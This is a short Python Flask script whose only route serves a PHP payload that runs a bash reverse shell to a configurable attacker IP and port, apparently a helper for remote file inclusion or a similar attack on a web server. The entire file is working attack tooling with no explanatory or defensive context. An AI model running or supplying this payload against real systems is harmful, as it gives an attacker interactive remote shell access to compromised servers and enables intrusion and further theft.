from flask import Flask, make_response

app = Flask(__name__)

IP = "127.0.0.1"
PORT = 1234
INTERNAL_PORT = PORT # these may difer if you're using port forwarding

@app.route("/", methods=['GET'])
def index():
    code = '''<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'");''' % (IP, PORT)

    return make_response(code)


if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=True, port=INTERNAL_PORT)
